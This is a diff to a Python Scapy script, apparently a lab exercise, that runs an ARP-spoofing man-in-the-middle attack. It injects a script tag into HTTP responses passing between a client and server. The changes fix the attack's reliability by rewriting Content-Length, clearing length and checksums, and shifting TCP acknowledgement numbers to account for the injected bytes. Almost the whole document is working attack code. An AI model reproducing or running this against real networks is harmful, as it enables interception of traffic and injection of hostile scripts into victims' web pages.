@@ -53,37 +53,70 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 
 # TODO: handle intercepted packets
 def interceptor(packet):
-	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script
+	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, portLength
 	if packet[Ether].src == attackerMAC:
 		return
 	
+	payload = '<script>' + script + '</script>'
 	if packet.haslayer(IP) and packet[Ether].dst == attackerMAC:
 		if packet[IP].src == serverIP and packet[IP].dst == clientIP:
 			if packet[IP].haslayer(Raw):
 				httpLoad = packet[Raw].load.decode('utf-8')
-				loadSubString = httpLoad.split()
-				payload = '<script>' + script + '</script>'
 				httpLoad = httpLoad.replace('</body>', payload + '</body>')
 				try:
+					loadSubString = httpLoad.split()
 					index = loadSubString.index('Content-Length:')
-					length = loadSubString[index+1]
-					newLength = int(length) + len(payload)
-					#print(f"length: {length}")
-					#print(f"new: {newLength}")
-					httpLoad = httpLoad.replace('Content-Length: ' + length, 'Content-Length: ' + str(newLength))
+					length = int(loadSubString[index+1])
+					portLength[packet[TCP].dport] = length
+					newLength = length + len(payload)
+					if newLength > 200:
+						print("# Response")
+						print(f"length: {length}")
+						print(f"new: {newLength}")
+						print(f"flags: {packet[IP].flags}")
+						print(f"sport: {packet[TCP].sport}")
+						print(f"dport: {packet[TCP].dport}")
+						print(f"seq: {packet[TCP].seq}")
+						print(f"ack: {packet[TCP].ack}")
+						#print(httpLoad)
+					httpLoad = httpLoad.replace('Content-Length: ' + str(length), 'Content-Length: ' + str(newLength))
 					#print(httpLoad)
 				except ValueError:
 					pass
 				packet[Raw].load = httpLoad.encode('utf-8')
-				packet[IP].len = packet[IP].len + len(payload)
+				del packet[IP].len
 				del packet[IP].chksum
 				del packet[TCP].chksum
 			packet[Ether].src = attackerMAC
 			packet[Ether].dst = clientMAC
 			frags = fragment(packet, fragsize = 500)
 			for frag in frags:
+				#frag.show2()
 				sendp(frag)
 		elif packet[IP].src == clientIP and packet[IP].dst == serverIP:
+			if packet.haslayer(Raw):
+				httpLoad = packet[Raw].load.decode('utf-8')
+				loadSubString = httpLoad.split()
+				if packet[TCP].sport in portLength:
+					packet[TCP].ack = packet[TCP].ack - len(payload)
+					lenDiff = len(str(len(payload)+portLength[packet[TCP].sport])) - len(str(portLength[packet[TCP].sport]))
+					packet[TCP].ack = packet[TCP].ack - lenDiff
+					portLength.pop(packet[TCP].sport)
+				try:
+					index = loadSubString.index('GET')
+					path = loadSubString[index+1]
+					if path == '/long.html':
+						print("# Request")
+						print(f"path: {path}")
+						print(f"sport: {packet[TCP].sport}")
+						print(f"dport: {packet[TCP].dport}")
+						print(f"seq: {packet[TCP].seq}")
+						print(f"ack: {packet[TCP].ack}")
+				except ValueError:
+					pass
+				del packet[IP].len
+				del packet[IP].chksum
+				del packet[TCP].chksum
 			packet[Ether].src = attackerMAC
 			packet[Ether].dst = serverMAC
 			frags = fragment(packet, fragsize = 500)
@@ -108,6 +141,8 @@ if __name__ == "__main__":
 	clientMAC = mac(clientIP)
 	serverMAC = mac(serverIP)
 	attackerMAC = get_if_hwaddr(args.interface)
+	
+	portLength = {}
 
 	# start a new thread to ARP spoof in a loop
 	spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
